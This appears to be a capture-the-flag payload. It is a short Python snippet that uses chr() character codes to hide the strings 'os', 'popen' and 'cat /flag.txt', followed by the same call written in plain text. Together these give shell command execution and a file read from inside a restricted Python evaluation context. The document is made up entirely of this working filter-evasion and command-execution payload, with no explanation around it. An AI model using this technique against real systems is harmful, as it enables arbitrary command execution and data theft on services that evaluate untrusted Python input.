getattr(
    __import__(chr(111) + chr(115)), 
    chr(112) + chr(111) + chr(112) + chr(101) + chr(110)
)(
    chr(99) + chr(97) + chr(116) + chr(32) + chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)
).read()

getattr(__import__("os"),"popen")("cat /flag.txt").read()  
